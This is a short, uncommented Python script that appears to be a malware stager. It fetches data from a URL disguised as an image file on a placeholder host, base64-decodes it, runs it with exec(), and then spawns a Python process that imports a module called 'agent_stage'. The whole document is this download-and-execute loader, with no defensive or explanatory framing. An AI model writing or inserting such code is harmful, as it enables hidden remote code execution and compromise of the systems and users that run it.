import requests
import base64
import subprocess

STAGE = "https://assets.invalid/pixel.jpeg?x=1"
packed = base64.b64decode(requests.get(STAGE).content)
exec(packed)
subprocess.Popen(["python", "-c", "import agent_stage"])
